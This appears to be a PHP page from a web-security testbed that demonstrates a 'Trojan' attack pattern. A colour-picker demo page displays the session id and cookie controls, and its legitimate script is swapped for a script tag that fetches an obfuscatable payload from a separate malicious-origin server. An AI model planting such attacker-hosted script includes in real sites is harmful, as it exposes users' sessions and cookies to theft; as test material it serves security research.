<?php
include('../declare.php');
include(INCDIR.'contentutil.php');

$title = 'Attack pattern prototype: Trojan';

$pl = isset($_REQUEST['payload']) ? $_REQUEST['payload'] : 'random';
$obfu = isset($_REQUEST['obfu']) ? $_REQUEST['obfu'] : 'random';

ob_start();
?>
<link type="text/css" href="jquery-ui-1.9.0/themes/base/jquery.ui.all.css" rel="stylesheet" />
<style type="text/css">
#red, #green, #blue {
  float: left;
  clear: left;
  width: 300px;
  margin: 15px;
}
#swatch {
  width: 120px;
  height: 100px;
  margin-top: 18px;
  margin-left: 350px;
  background-image: none;
}
#red .ui-slider-range { background: #ef2929; }
#red .ui-slider-handle { border-color: #ef2929; }
#green .ui-slider-range { background: #8ae234; }
#green .ui-slider-handle { border-color: #8ae234; }
#blue .ui-slider-range { background: #729fcf; }
#blue .ui-slider-handle { border-color: #729fcf; }
#demo-frame > div.demo { padding: 10px !important; };
</style>
<?
$header = ob_get_clean();

include(INCDIR.'header.php');
?>
<h1>Trojan</h1>
<p class="instructions">
Here's a legitimate web application that incorporates code from an
untrusted source.
</p>
<h3>Private session information</h3>
<p class="instructions" id="session">Session id: <?=session_id()?></p>
<form action="">
<input type="text" name="value" value="Input value here"></input>
<input type="submit" value="Submit"></input>
</form>
<input type="text" id="setkey" value="cookie-key"></input>
<input type="text" id="setval" value="cookie-value"></input>
<input type="button" id="setbtn" value="Set cookie"></input>
<input type="text" id="getkey" value="cookie-key"></input>
<input type="button" id="getbtn" value="Get cookie"></input>

<!-- colorpicker begin -->
<div class="demo">

<p class="ui-state-default ui-corner-all ui-helper-clearfix" style="padding:4px;">
<span class="ui-icon ui-icon-pencil" style="float:left; margin:-2px 5px 0 0;"></span>
Simple Colorpicker
</p>

<div id="red"></div>
<div id="green"></div>
<div id="blue"></div>

<div id="swatch" class="ui-widget-content ui-corner-all"></div>

</div><!-- End demo -->
<!-- colorpicker end -->

<!--<script type="text/javascript" src="<?=TGTROOT?>trojan/legit.js"></script>-->
<script type="text/javascript" src="<?=MALALTROOT?>trojan/getscript?payload=<?=AttrEscape(urlencode($pl))?>&obfu=<?=AttrEscape(urlencode($obfu))?>"></script>
<?

$links = array(
  'trojan start' => TGTROOT."trojan/start",
);
include(INCDIR.'footer.php');
?>
